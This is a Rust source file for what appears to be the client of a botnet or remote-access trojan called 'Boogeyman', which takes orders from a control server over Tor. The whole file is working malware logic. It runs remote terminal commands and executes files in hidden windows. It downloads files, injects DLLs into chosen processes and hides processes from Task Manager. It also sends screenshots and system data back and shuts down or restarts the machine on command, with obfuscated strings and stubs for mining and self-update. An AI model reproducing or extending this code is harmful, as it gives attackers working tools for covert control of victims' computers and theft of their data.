use std::{
    os::windows::process::CommandExt,
    path::PathBuf,
    process::Command,
    sync::{ Arc, Mutex, RwLock },
};
use anyhow::{ Context, Result };
use client_vars::{
    constants::client_version,
    types::{
        receive::{ self, BoogeymanReceivePayload, ClientParams },
        send::{ self, BoogeymanSendPayload, InitParams, ServerAction, ServerParams },
        structs::BotState,
    },
};
use shared::{
    network::tor::{ LoggerConfig, ServerReceiveType, TorHandler },
    utils::functions::{ restart_pc_instant, shutdown_pc_instant, write_file_to_random_folder },
};
use obfstr::obfstr as s;
use crate::{
    tasks::task_manager_hook::{ inject_dll, update_query_hooker_list },
    utils::{
        system_info::{ generate_bot_state, get_dynamic_info, get_thumbnail },
        terminal::Terminal,
    },
};
use super::basic::download_file_to_path;

#[derive(Clone)]
pub struct BotHandler {
    tor_handler: TorHandler,
    bot_state: Arc<RwLock<BotState>>,
    terminal: Option<Arc<Mutex<Terminal>>>,
}

impl BotHandler {
    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
        let tor_handler = TorHandler::new(logger_config).await?;
        let bot_state = generate_bot_state().await;
        Ok(BotHandler {
            tor_handler,
            bot_state: Arc::new(RwLock::new(bot_state)),
            terminal: match Terminal::new() {
                Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
                Err(_error) => {
                    // err!("error getting terminal: ", error);
                    None
                }
            },
        })
    }

    pub async fn run_handler(&mut self) {
        let self_clone = Arc::new(RwLock::new(self.clone()));
        let self_clone2 = self_clone.clone();

        self.tor_handler.run(
            move || {
                Self::connect_callback_init(self_clone.clone());
            },
            move |handler, data| { Self::process_data(handler.clone(), data, self_clone2.clone()) }
        ).await;
    }
    pub fn connect_callback_init(self_ref: Arc<RwLock<Self>>) {
        let self_guard = self_ref.read().unwrap();
        let params = InitParams { bot_state: self_guard.bot_state.read().unwrap().clone() };
        if
            let Err(_error) = Self::send_data(
                &self_guard.tor_handler,
                ServerAction::Init,
                ServerParams::Init(params)
            )
        {
            // err
        }
    }

    fn process_data(
        tor_handler: TorHandler,
        binary_data: Vec<u8>,
        self_ref: Arc<RwLock<Self>>
    ) -> Result<()> {
        let processed_data: BoogeymanReceivePayload = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(tor_handler, processed_data, self_ref)
    }

    fn route_data(
        tor_handler: TorHandler,
        processed_data: BoogeymanReceivePayload,
        self_ref: Arc<RwLock<Self>>
    ) -> Result<()> {
        match processed_data.action {
            receive::ClientAction::UninstallSelf => {}
            receive::ClientAction::UpdateSelf => {}
            receive::ClientAction::CallTerminalCommand => {
                if let ClientParams::CallTerminalCommand(params) = processed_data.params {
                    if let Some(terminal_ref) = &self_ref.read().unwrap().terminal {
                        let mut terminal = terminal_ref.lock().unwrap();

                        let data = match terminal.execute(&params.command) {
                            Ok(data) =>
                                send::TerminalOutputParams { output: Some(data), error: None },
                            Err(error) =>
                                send::TerminalOutputParams {
                                    output: None,
                                    error: Some(format!("{:#?}", error)),
                                },
                        };
                        drop(terminal);
                        Self::send_data(
                            &tor_handler,
                            ServerAction::TerminalOutput,
                            ServerParams::TerminalOutput(data)
                        )?;
                    } else {
                        return Err(anyhow::anyhow!(s!("Terminal not initialized").to_string()));
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::DownloadAndExecFileInMemory => {}
            receive::ClientAction::FetchLogs => {
                // all the log folders - just read each file in them - store a map of filename - data

                // load bytes - split by b"\r\n\r\n"
                // decrypt each split, convert into parsed

                // parsed will be - date, tag, content - ordered all strings
                // then just send like 5 maps of that

                // and the fetch params will simply be bools of which to get, and also timedate range of which to include

            }
            receive::ClientAction::CompressDirAndSend => {}
            receive::ClientAction::CallSysEvent => {
                if let ClientParams::CallSysEvent(params) = processed_data.params {
                    match params.event {
                        receive::SysEvent::Shutdown => {
                            shutdown_pc_instant()?;
                        }
                        receive::SysEvent::Restart => {
                            restart_pc_instant()?;
                        }
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::FetchDynamicData => {
                if let ClientParams::FetchDynamicData(_params) = processed_data.params {
                    let data = send::UpdateDynamicDataParams { dynamic_info: get_dynamic_info() };

                    Self::send_data(
                        &tor_handler,
                        ServerAction::UpdateDynamicData,
                        ServerParams::UpdateDynamicData(data)
                    )?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::FetchThumbnail => {
                if let ClientParams::FetchThumbnail(_params) = processed_data.params {
                    let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };

                    Self::send_data(
                        &tor_handler,
                        ServerAction::UpdateThumbnail,
                        ServerParams::UpdateThumbnail(data)
                    )?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::UpdateTaskManagerExclusions => {
                if let ClientParams::UpdateTaskManagerExclusions(params) = processed_data.params {
                    update_query_hooker_list(params)?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::ExecLocalFile => {
                if let ClientParams::ExecLocalFile(params) = processed_data.params {
                    let mut program = Command::new(params.abs_path);
                    if params.hidden {
                        program.creation_flags(0x08000000); // CREATE_NO_WINDOW flag
                    }
                    if let Some(args) = params.args {
                        program.raw_arg(format!(" {}", args));
                    }
                    if params.wait_for_output {
                        let output = program
                            .output()
                            .context(s!("Failed to get output from ExecFile").to_string())?;

                        let data = send::ExecFileOutputParams {
                            status: output.status.code(),
                            stdout: output.stdout,
                            stderr: output.stderr,
                        };

                        Self::send_data(
                            &tor_handler,
                            ServerAction::ExecFileOutput,
                            ServerParams::ExecFileOutput(data)
                        )?;
                    } else {
                        program.spawn().context(s!("Failed to ExecFile").to_string())?;
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::UpdateMinerConfig => {
                //
            }
            receive::ClientAction::DownloadFile => {
                if let ClientParams::DownloadFile(params) = processed_data.params {
                    let path = PathBuf::from(params.abs_path);
                    if let Some(bytes) = params.from_bytes {
                        std::fs::write(path, bytes)?;
                    } else if let Some(url) = params.from_url {
                        futures::executor::block_on(async {
                            let _ = download_file_to_path(&url, path).await;
                            // handle error
                        });
                    }

                    // send output if fail
                    // let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };

                    // Self::send_data(
                    //     tor_handler,
                    //     ServerAction::UpdateThumbnail,
                    //     ServerParams::UpdateThumbnail(data)
                    // )?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::InjectDll => {
                if let ClientParams::InjectDll(params) = processed_data.params {
                    let dll_path = write_file_to_random_folder(s!("data.dll"), &params.dll_bytes)?;
                    inject_dll(params.pid, dll_path.to_str().unwrap())?;
                    // send output if fail
                    // let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };

                    // Self::send_data(
                    //     tor_handler,
                    //     ServerAction::UpdateThumbnail,
                    //     ServerParams::UpdateThumbnail(data)
                    // )?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
        }
        Ok(())
    }
    fn send_data(
        tor_handler: &TorHandler,
        action: ServerAction,
        params: ServerParams
    ) -> Result<()> {
        let payload = BoogeymanSendPayload {
            id: tor_handler.constant_device_id.read().unwrap().to_owned(),
            version: client_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_handler.add_to_send_queue(ServerReceiveType::Boogeyman, binary_data)
    }
}
